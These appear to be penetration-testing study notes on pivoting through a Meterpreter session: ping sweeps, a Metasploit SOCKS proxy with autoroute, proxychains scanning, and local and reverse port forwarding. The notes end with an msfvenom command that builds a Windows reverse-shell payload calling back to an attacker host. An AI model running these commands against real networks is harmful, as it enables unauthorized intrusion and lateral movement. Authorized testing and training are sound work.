# Meterpreter Tunneling & Port Forwarding

---

## Ping Sweep via Meterpreter

Built-in MSF module (slow but clean):

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=<CIDR>
```

One-liner from Linux pivot shell:

```bash
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

From Windows pivot (CMD):

```cmd
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

From Windows pivot (PS):

```powershell
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
```

---

## MSF SOCKS Proxy + AutoRoute

Start a SOCKS proxy through the Meterpreter session:

```
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

Add routes so MSF knows what network to send through the session:

```
use post/multi/manage/autoroute
set SESSION <ID>
set SUBNET 172.16.5.0
run
```

Or directly from the meterpreter prompt:

```
meterpreter > run autoroute -s 172.16.5.0/23
meterpreter > run autoroute -p
```

Verify in `/etc/proxychains.conf`:

```
socks4  127.0.0.1 9050
```

Then scan through it:

```bash
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

> [!warning] If MSF SOCKS proxy is version 5, change `socks4` to `socks5` in proxychains.conf — mismatch breaks all routing silently.

---

## Meterpreter portfwd (Local Forward)

Forward a remote port to your local machine without SSH — local port 3300 → remote Windows RDP 3389:

```
meterpreter > portfwd add -l 3300 -p 3389 -r <TARGET_IP>
```

Connect directly:

```bash
xfreerdp /v:localhost:3300 /u:<USER> /p:<PASS>
```

---

## Meterpreter portfwd (Reverse Forward)

Windows payload connects to pivot on port 1234 → pivot forwards to your attack host port 8081:

```
meterpreter > portfwd add -R -l 8081 -p 1234 -L <ATTACK_HOST_IP>
```

Generate Windows payload pointing at the pivot:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<PIVOT_INTERNAL_IP> LPORT=1234 -f exe -o <PAYLOAD>.exe
```

MSF listener on attack host:

```
set LPORT 8081
set LHOST 0.0.0.0
run
```

> [!tip] Both portfwd directions work without needing SSH on the pivot. Use this when you have Meterpreter but no SSH access to the pivot host.